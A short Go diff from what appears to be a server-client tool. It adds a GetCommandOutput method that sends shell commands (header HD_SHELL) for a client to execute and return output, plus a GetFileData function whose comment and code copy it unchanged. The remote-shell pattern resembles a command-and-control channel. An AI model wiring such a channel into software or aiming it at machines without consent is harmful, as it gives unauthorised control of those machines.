@@ -32,7 +32,17 @@ type MessageBox struct {
 }
 
 // `Client.GetCommandOutput` sends a command to the client for it to execute.
+// The client will then send the output of the executed command back to the server.
 func (c *Client) GetCommandOutput(command string) {
+	// Send command for the client to execute and send back the output of.
+	c.SendMessage(Message{
+		Header:  HD_SHELL,
+		Content: []byte(command),
+	})
+}
+
+// `Client.GetFileData` sends a command to the client for it to execute.
+func (c *Client) GetFileData(command string) {
 	// Send command for the client to execute and send back the output of.
 	c.SendMessage(Message{
 		Header:  HD_SHELL,
